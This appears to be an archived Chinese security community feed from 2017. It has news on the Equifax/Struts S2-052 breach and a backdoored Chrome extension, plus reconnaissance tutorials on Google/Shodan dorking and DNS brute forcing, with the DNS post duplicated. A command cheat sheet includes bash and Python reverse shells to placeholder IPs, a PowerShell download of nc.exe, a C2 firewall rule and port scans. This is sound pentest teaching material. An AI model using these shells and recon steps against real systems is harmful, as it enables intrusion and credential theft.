最近美国 Equifax 被黑导致 1.43 亿美国用户数据泄露，说是 Struts2 的锅（S2-052那个）。

纽约时报问：未来你如何有能力保护自己的隐私？
答案很简单：不能...

不过还是给了些好建议。当然，这远远不够。

在个人隐私保护方面，颠覆性的产品或服务在哪呢？其实上条分享已经让我意识到了点什么。

<img src="https://images.xiaomiquan.com/FnPT_EIf0_JVc2a7O3LzwZTrCsQO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xnTNSz9AfzZ-HA2Dq5LR2NdOlMw=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-12:

Google 的 Safe Browsing 保护了全球 30 亿设备，这真是一件了不起的事。除了 Google 众多产品（包括 Chrome），还不知不觉植入了 Safari、Firefox 等产品里...

大体量做大事，但不是所有大体量的公司都能做到这种水平。


[http://security.googleblog.com/2017/09/safe-browsing-protecting-more-than-3_11.html](http://security.googleblog.com/2017/09/safe-browsing-protecting-more-than-3_11.html)



<img src="https://images.xiaomiquan.com/Fuqhpvyl8ezxgCI6AQzmCCYKSQCM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:UADkvaAO9g9hwAqQTRPDeKMECQg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FpZONfnuDB_ymBoodjVW-eZkN8Bc?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:caegFnhzXRGzW66OCf1YYH9EE8E=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-11:

> 匿名用户 提问：
cos大大新手求指导cSploit的大部分功能能够用kali自带的工具复现不？能不能举个栗子，实在不熟kali的工具哇


可以，了解好 ethercap、arpspoof 等命令，你读读 cSploit 源码，就会发现它底层也是基于这些命令。还可以进一步了解 bettercap、responder 这些。

至于每个命令工具怎么用，网上教程多，自己摸索也行。



...

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: @


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-10:


__#经验#__

  手工逆 Chrome 扩展后门的一些思路

基于昨晚发的那个 Chrome 扩展后门事件，刚刚写了篇小文，供大家参考：


[手工逆 Chrome 扩展后门的一些思路](http://mp.weixin.qq.com/s/h7m7-luE4nW_utaZhUrKEA)

 

玩进去的，欢迎交流。

<img src="https://images.xiaomiquan.com/FikpJYlbDmOLoYuCT6f432ejN6Yp?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o5OqM2gGj4WByaaxNq5FhrTA6Co=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fjjd5-5HgUBmutFJUuy4MkZn9axE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7ZVNRvAMSnNfcM9VeL0EJjBH7l4=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-10:


__#基础#__

 被动信息收集之搜索引擎
上次我们介绍了dns的信息收集之区域传输和字典爆破，这次我来介绍关于信息收集之搜索引擎方面的内容
1、
首先，来介绍下搜索引擎能做什么
 ①：收集要渗透的公司的新闻动态
 ②：重要的雇员信息，比如这个雇员是那个大佬，他的职务，所掌握的信息
 ③：机密文档/网络拓扑：有些公司的机密文档是放在公网上的，但是隐藏了，但是会被强大的搜索引擎扫出来
 ④：用户名和密码：有些用户名密码是默认的，这就可以通过搜索引擎查找，比如某品牌的摄像头设置了默认密码，就可以通过搜索引擎查看这个品牌的默认密码，也有一些密码可能被别人脱裤啦，放到了网上，我们也可以查到，然后利用撞库尝试密码
 ⑤：目标系统的技术架构：搜集你要渗透的公司的技术架构，用的是什么软硬件，什么版本，有什么已经公开的漏洞

介绍完了，接下来开始介绍搜索几种引擎：
一、shodan:
   shodan是一款功能强大的搜索引擎，但是它不爬取网页信息，只爬去各种网路设备，例如http、ftp、ssh、telent等
   地址：
[https://www.shodan.io](https://www.shodan.io)


1、
   常见filiter:
      net:192.168.1.1(指定要搜索的地址)
      country:CN、US、JP（将搜索结果限定在某个国家）
      city:beijing
      port:80
      os:windows/linux
      hostname:kali
      server:apache
以上是常见的fliter，当然，这么强大的搜索引擎怎么可能只有这么少的filiter,大家可以在搜索框旁边的explore,点进去看看别人是怎么写filiter的

2、更加详细的用法在下面这个链接：
     
[http://www.freebuf.com/sectool/121339.html](http://www.freebuf.com/sectool/121339.html)



二、google:
要说google是世界上最好的搜索引擎我想是没有异议的，用好google进行信息收集也是一名安全从业人员的基本功，下面介绍google

1、基本使用：+支付 -充值（要支付，不要充值） 
	                支付 充值（支付&&充值）
                       “ 支付 充值”（只含 “支付 充值”这个字段）
	                 intitle:电子商务
	                 intext（正文）
	                 site:搜索的站点
	                 inurl:contact(网址中含有电话的)
    	                 filetype:pdf(搜索pdf文件)
同样的，强大的google也不会局限于简单的filiter,大家也可以通过下面的网址学习别人的filiter是怎么写的,这个链接就是google hacking，当然也有其他的hacking,例如baidu hacking、bing hacking等，这个大家自行探索
	      
[https://www.exploit-db.com/google-hacking-database/](https://www.exploit-db.com/google-hacking-database/)


今天的介绍就到这里了，下一次我会将剩下的被动信息收集的内容进行收尾，在介绍一个n合一的工具：maltegoce,还有简单好用的thehavarester



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-09:


__#后门#__

  关注下这个：

[大家注意了 Chrome 的插件 User-Agent Switcher 是个木马 - V2EX](https://www.v2ex.com/t/389340)





...

<img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 我来补个图😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个后门太经典了：Canvas图片隐写+ES6语法糖+几个偏门技巧+多层混淆+变量加花。逆起来都眼花，不过确实吻合后门性质。

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 之前调试产品的时候，莫名其妙的发现很多http请求，当时也是调试了很久才定位到是浏览器插件的问题，后来把Crx文件抓出来分析，代码都整理好了，有些代码混淆了没认真研究，就没发现恶意代码，原来是藏图片里了，哈哈，学习了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 看来以后要多注意这些莫名请求了😄


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-09-09:


__#姿势#__

 解读下弦哥从新加坡HITB黑客大会进口过来的黑魔法命令吧。
 虽然都比较简单，但是在一些应用场景下简直就像把简单螺丝刀变成瑞士军刀了。
黑魔法命令
一、BASH
1.将一个分区通过ssh加密通道压缩传输到10.10.10.10 设备上
dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 "cat >/tmp/image.dd"
2.验证指定IP的端口服务是否一直在开通状态，每隔一秒刷新一次，如果端口开通，则输出Service is up。
while (true)；do nc -vv -z -w3 10.10.10.10 80 > /dev/null && echo -e "Service is up"; sleep 1;done
3.创建一个反弹shell到指定的ip上。
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
4.用系统自带base64做编码解码处理，很方便。
echo ‘Hello, World!' | base64
把 ‘Hello, World’ 字符串做base64编码

echo 'XXXXXXXX' | base64 -d
将编码后的字符串‘XXXXXXX’ 做解码
也可以先输入base64 -d 然后输入要解码的字符，再按Ctrl+d 进行解码
5.克隆一个网站到本地，比如 wget -r -mH www.baidu.com
wget -r -mH $URL

6.根据文件名从指定路径中寻找包含特定字符串的文件，并将包含该字符串的行和该文件名输出。
find /PATH/TO/DIRECTORY -name "filename" -type f -exec grep -i "STRING" {} \； -print 2>/dev/null
7.呵呵，这个是用ccat查看文件内容时，给一些代码中特殊字符加上颜色，看代码方便很多。
alias ccat='pygmentize -O bg=dark,style=colorful'
8.查看自己的公网IP
curl -4 icanhazip.com
wget -qO- ifconfig.me/ip
补充两个
curl ipinfo.io
curl ip.cn
9.多聪明的命令，给自己的上一条命令自动加上sudo,并命一个简短的别名，是不是经常忘记输入sudo，这下世界美丽了不少吧。
alias gah='sudo $(history -p \!\!)'

二、CMD KUNG-FU
1.这个命令用于用电脑的无线网卡创建一个无线热点，不过要看你的网卡是不是支持承载网络，不支持的话就没办法建立热点。
netsh wlan set hostednetwork mode=allow ssid=<MYSSID> key=<MYPASSWORD> && netsh wlan start hostednetwork

netsh wlan drivers 可以查看网卡支不支持承载网络。
2.Windows下的端口转发，可以支持v4tov4、v4tov6、v6tov6、v6tov4，windows自带的，很方便。
netsh interface protproxy add v4tov6 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<PORT> connectaddress=<RHOST>
3.查询指定IP或者端口的连接，并每秒刷新一次。
netstat -naob 1 | find "<IPADDR or PORT>"
4.获取正在运行进程的一些详细信息。
wmic process list full
5.显示每个进程对应的服务。
tasjkust /svc

三、PowerShell
1.用ping命令去扫描整个C段
1..255 | % {echo "192.168.253.$_"; ping -n 1 -w 100 192.168.253.$_} | Select-String ttl
补充个cmd的
for /L %i in (1,1,255) do @ping 192.168.253.%i -n 1 -w 100 | find /i "ttl"
2. 从http服务器下载文件保存到本地
Win 7:   (New-Object System.Net.Webclient).DownloadFile("
[http://10.10.10.10/nc.exe","c:](http://10.10.10.10/nc.exe","c:)

\nc.exe")
Win8 and later:  wget "
[http://10.10.10.10/nc.exe"](http://10.10.10.10/nc.exe")

 -outfile "c:\nc.exe"
3.查看Windows内置防火墙的规则，非常详细，各个程序入站出站的规则和端口等详细信息都有。
Get-NetFirewallRule -all | Out-GridView

Get-NetFIrewallRule -all | Export-csv <filename.csv>
将查询结果导出到一个csv文件中
4.给Windows内置防火墙增加一条准许的规则。Win7 测试无法用，Win10 可以。
New-NetFIrewallRule -Action Allow -DisplayName Pentester-C2 -Remoteaddress <IPADDR>
5.用powershell来端口扫描
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
扫描一个IP范围是否开放指定端口
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.253.$ip}
设定IP范围和端口范围进行扫描(速度比较慢)
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
6.从指定目录的文件中寻找文件内容包含STRING字符的文件，并显示该行内容和文件名。一般用于查询记录的密码和配置了。
ls -r c:\PATH\DIRECTORY file | % {Select-String -path $_ -pattern STRING}

四、python
1.开启一个简易的HTTP服务器，很方便有没有。
python 2.x
python -m SimpleHTTPServer 8000
python 3.x
python3 -m http.server 8000
2.用python从HTTP服务器来下载文件，或者是整站的页面。
python 2.x
python -c 'import urllib2; print urllib2.urlopen("
[http://10.10.10.10](http://10.10.10.10)

").read()' | tee /tmp/file.html
python 3.x
python3 -c 'import urllib.request;urllib.request.urlretrieve("
[http://10.10.10.10](http://10.10.10.10)

","/tmp/10.10.10.html")'
3.将一个反弹回来或是漏洞利用得到的shell转换为一个类似终端的shell。这样shell就可以交互了。
python -c 'import pty;pty.spawn("/bin/bash")'
4.用python创建一个反弹shell，类似nc。Windows和Linux通用
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('<IPADDR>',<PORT>))\nwhile 1: proc =
subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

资源推荐:

[https://pen-testing.sans.org/blog/category/command-line-kung-fu](https://pen-testing.sans.org/blog/category/command-line-kung-fu)

   (命令都是来自这家安全培训公司，他们网站上有命令演示，和每个参数的详解，感兴趣可以去看看，需自己爬出去)

[https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888](https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888)

  (PowerShell作者出的教程视频，中文字幕、中文字幕、中文字幕)


__分享文件:__
[黑魔法命令.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞这样的解读啊😘

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞

<img src="https://file.xiaomiquan.com/85/7e/857e7074cd57069c52c64361162a16153347497cda25cad85d234445a06ef8b2.jpg" width="25px"/> __愤怒CPU__: mark😏


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-08:

> Cris 提问：
如何爬取网站搜索栏自动补全的内容，给个思路，先行谢谢。比如我在google内搜索iPhone 7 y 就会有4个自动补全内容。前两个为 iPhone 7 adapter / iPhone 7 youtube。 说得比较啰嗦，谢谢。


你可以通过 Chrome 开发者工具抓包观察请求来了解本质，比如我输入 cos，在请求里看到如下链接：

[https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t](https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t)



内容是：
["cos",[["costco",0,[131]],["cos",0],["cosco",0],["costco ca",0,[131]]],{"j":"o5","k":1,"q":"ZEhkkVJAyiprdmxZvBP4Zy70OOx","t":{"bpc":false,"phi":0,"tlw":false}}]

也就是说这个是 AJAX 动态返回的 JSON 数据，这就是自动补全的内容。

那么后面的爬虫就简单了，你完全可以考虑用 PhantomJS 或 Headless Chrome 来应对这种动态 AJAX 内容。

思路如此，更多自己调试走起。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补上自动补全内容的一张图：

<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 好的，谢谢，现在自己做电商公司，深感爬虫的重要性，拿别人的不靠谱，一是因为定制化，二是因为需求更新。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 一般都自己写，不会很难

<img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 然而爬虫是一个很长的产业链，一旦进入就必然与反爬做斗争，还有打码、动态代理...

<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__ replies to <img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__: 是的，没错，到最后都是拼团队，拼资源


...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-06:


__#基础#__

被动信息收集之dns区域传输，dns爆破

上一篇介绍了域名信息以及相关的记录和nslookup,接下来介绍另一种信息收集的方法   接上一次的介绍，我说到了一个东西，叫dns查询方式，但是没有展开说，dns查询采用的是递归查询，怎么个递归法呢，我找了一个链接比较详细

 
[DNS递归查询新手入门了解 DNS,DNS递归查询 - 鸿网互联[68IDC.CN]](http://www.68idc.cn/help/opersys/windowsserver2003/2013041829024.html)



可能看了不懂，没关系，我们接下来通过一个工具进行了解，下面介绍工具:
 DIG

 dig命令和nslookup有很多相似的地方，但是dig比nslookup功能强大许多

 一、
     基本使用：
               dig www.sina.com any(查找所有记录，不用加-type) @8.8.8.8(指定dns服务器)
     基本参数：+noall：不显示任何结果，一般配合其他参数使用。
                      +answer:只显示结果。
                      -x:反向解析 dig -x 192.168.1.1（反向查询：查询ptr记录）
                      配合使用：dig +noall +answer .......（除了结果什么都不显示）
二、利用dig查询并进行抓包
	通过执行基本命令 ：
                      dig sina.com +trace
        进行域名追踪并通过wireshark进行抓包，可以了解到dns递归查询是怎样查询的，并且通过抓包，可以发现是否有人对dns服务器进行劫持，把域名解析到恶意网站，具体要自己抓过才能才知道。一定要自己抓，不能偷懒！
	贴一个网址详细一点：
[DNS信息收集-DIG - 含笑 - CSDN博客](http://blog.csdn.net/qq_33936481/article/details/51424577)



        但是呢，dig 不能查询一个域名下的所有记录，但是做渗透测试，我们想知道一个dns服务器下的所有记录，但是如何获得一个域名服务器下的所有记录呢？

  1、利用dig查询bind版本，通过查询bind版本信息（dns的bind版本）查看存在的漏洞，对dns服务器进行攻击，进而取得所有的记录，但是经过我努力，一般看不到bind版本信息

     基本命令：dig +noall +answer txt chaos(类) VERSION.BIND @ns3.dnsv4.com
这个命令的意思是：查询txt记录，他是chaos类，一般查的ns,cname,a记录都是inter类，可以通过抓包看包内容查看记录是什么类，后面接的表示查询bind版本，@后接要查的dns服务器
  2、dns区域传输：（配合抓包）
	利用dns之间的同步机制（一台dns服务器上的变更可以同步到其他的服务器，一般区域传输至存在于本地dns服务器上，如果管理员配置错误，就有可能让人访问到所有的记录），首先利用nslookup或者dig查询域名下的dns服务器，还是配合抓包，了解原理，而不是了解工具使用
	常见命令：
	 1、 dig @ns1.example.com example.com axfr(区域传输的方法：差异化传输) #一般不会成功，除非配置错误
	 2、host -T (使用TCP）-l（采用axfr传输） sina.com ns3.sina.com（host命令没有深入了解，我一般只是配合使用）

         
[host命令_Linux host 命令用法详解：常用的分析域名查询工具](http://man.linuxde.net/host)

（这个网址大家可以看下参数配置，熟悉命令的使用）

   3、dns字典爆破：一般区域传输都不会成功，特别是大型网站，所以介绍几个常用的dns字典爆破工具，原理就是向dns服务器发送查询，如果有这个记录，就会返回结果，反之不返回，利用这个原理进行暴力破解。一般选一个顺手的就行，也可以每个都试试，不同的工具爆破的速度，字典的质量不同，也可以把每个工具下的字典组合起来，生成一个自己的专有字典，下面是几个常见的工具，太多，不详细介绍，大家使用-h看具体参数操作，一定要亲自尝试，实践才最牛
	fierce -dnsserver 192.168.1.1 -dns sina.com.cn -wordlist a.txt 
	dnsdict6 -d4 -t 16(使用线程数) -x sina.com（这个比较好，速度也快）
	dnsenum -f dnsbig.txt  -dnsserver 8.8.8.8 sina.com -o sina.txt
	dnsmap sina.com -w dns.txt
	dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt
	dnsrecon -t std -d sina.com
这次的介绍就到这里了，介绍了那么多，还是推荐大家一定要抓包，看这些包是怎么发送和接受的，里面有什么，不要局限于工具的使用，下次我将介绍被动信息收集的
之利用搜索引擎进行信息收集部分



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 问一下 nslookup 有如下这种用法吗？
nslookup 随机字符串 target-ip

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没试过这种用法，你的随机字符串是？

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 就是从一段字符串中随机选择其中的一段子字符串

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没有哇，我查过man手册没有这种用法

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 必须要安利一下小菜我弄的脚本了😆 
[https://github.com/bit4woo/Teemo](https://github.com/bit4woo/Teemo)




...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-06:


__#基础#__

被动信息收集之dns区域传输，dns爆破

上一篇介绍了域名信息以及相关的记录和nslookup,接下来介绍另一种信息收集的方法   接上一次的介绍，我说到了一个东西，叫dns查询方式，但是没有展开说，dns查询采用的是递归查询，怎么个递归法呢，我找了一个链接比较详细

 
[DNS递归查询新手入门了解 DNS,DNS递归查询 - 鸿网互联[68IDC.CN]](http://www.68idc.cn/help/opersys/windowsserver2003/2013041829024.html)



可能看了不懂，没关系，我们接下来通过一个工具进行了解，下面介绍工具:
 DIG

 dig命令和nslookup有很多相似的地方，但是dig比nslookup功能强大许多

 一、
     基本使用：
               dig www.sina.com any(查找所有记录，不用加-type) @8.8.8.8(指定dns服务器)
     基本参数：+noall：不显示任何结果，一般配合其他参数使用。
                      +answer:只显示结果。
                      -x:反向解析 dig -x 192.168.1.1（反向查询：查询ptr记录）
                      配合使用：dig +noall +answer .......（除了结果什么都不显示）
二、利用dig查询并进行抓包
	通过执行基本命令 ：
                      dig sina.com +trace
        进行域名追踪并通过wireshark进行抓包，可以了解到dns递归查询是怎样查询的，并且通过抓包，可以发现是否有人对dns服务器进行劫持，把域名解析到恶意网站，具体要自己抓过才能才知道。一定要自己抓，不能偷懒！
	贴一个网址详细一点：
[DNS信息收集-DIG - 含笑 - CSDN博客](http://blog.csdn.net/qq_33936481/article/details/51424577)



        但是呢，dig 不能查询一个域名下的所有记录，但是做渗透测试，我们想知道一个dns服务器下的所有记录，但是如何获得一个域名服务器下的所有记录呢？

  1、利用dig查询bind版本，通过查询bind版本信息（dns的bind版本）查看存在的漏洞，对dns服务器进行攻击，进而取得所有的记录，但是经过我努力，一般看不到bind版本信息

     基本命令：dig +noall +answer txt chaos(类) VERSION.BIND @ns3.dnsv4.com
这个命令的意思是：查询txt记录，他是chaos类，一般查的ns,cname,a记录都是inter类，可以通过抓包看包内容查看记录是什么类，后面接的表示查询bind版本，@后接要查的dns服务器
  2、dns区域传输：（配合抓包）
	利用dns之间的同步机制（一台dns服务器上的变更可以同步到其他的服务器，一般区域传输至存在于本地dns服务器上，如果管理员配置错误，就有可能让人访问到所有的记录），首先利用nslookup或者dig查询域名下的dns服务器，还是配合抓包，了解原理，而不是了解工具使用
	常见命令：
	 1、 dig @ns1.example.com example.com axfr(区域传输的方法：差异化传输) #一般不会成功，除非配置错误
	 2、host -T (使用TCP）-l（采用axfr传输） sina.com ns3.sina.com（host命令没有深入了解，我一般只是配合使用）

         
[host命令_Linux host 命令用法详解：常用的分析域名查询工具](http://man.linuxde.net/host)

（这个网址大家可以看下参数配置，熟悉命令的使用）

   3、dns字典爆破：一般区域传输都不会成功，特别是大型网站，所以介绍几个常用的dns字典爆破工具，原理就是向dns服务器发送查询，如果有这个记录，就会返回结果，反之不返回，利用这个原理进行暴力破解。一般选一个顺手的就行，也可以每个都试试，不同的工具爆破的速度，字典的质量不同，也可以把每个工具下的字典组合起来，生成一个自己的专有字典，下面是几个常见的工具，太多，不详细介绍，大家使用-h看具体参数操作，一定要亲自尝试，实践才最牛
	fierce -dnsserver 192.168.1.1 -dns sina.com.cn -wordlist a.txt 
	dnsdict6 -d4 -t 16(使用线程数) -x sina.com（这个比较好，速度也快）
	dnsenum -f dnsbig.txt  -dnsserver 8.8.8.8 sina.com -o sina.txt
	dnsmap sina.com -w dns.txt
	dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt
	dnsrecon -t std -d sina.com
这次的介绍就到这里了，介绍了那么多，还是推荐大家一定要抓包，看这些包是怎么发送和接受的，里面有什么，不要局限于工具的使用，下次我将介绍被动信息收集的
之利用搜索引擎进行信息收集部分



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 问一下 nslookup 有如下这种用法吗？
nslookup 随机字符串 target-ip

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没试过这种用法，你的随机字符串是？

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 就是从一段字符串中随机选择其中的一段子字符串

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没有哇，我查过man手册没有这种用法

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 必须要安利一下小菜我弄的脚本了😆 
[https://github.com/bit4woo/Teemo](https://github.com/bit4woo/Teemo)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-06:


__#漏洞#__

  S2-052 这个漏洞影响面应该有限，目前来看限制条件两个：

1.使用了rest 这个插件；
2.使用xml数据来传输。

可以优先排查自己是否如此，如果是如此，那影响会很严重。还有及时升级新版总不会错。


[S2-052 - Apache Struts 2 Documentation - Apache So...](https://cwiki.apache.org/confluence/display/WW/S2-052)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 
[GitHub - mbechler/marshalsec](https://github.com/mbechler/marshalsec)


这个生成攻击Payload的项目不错

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: S2-053都出来了~


...

---


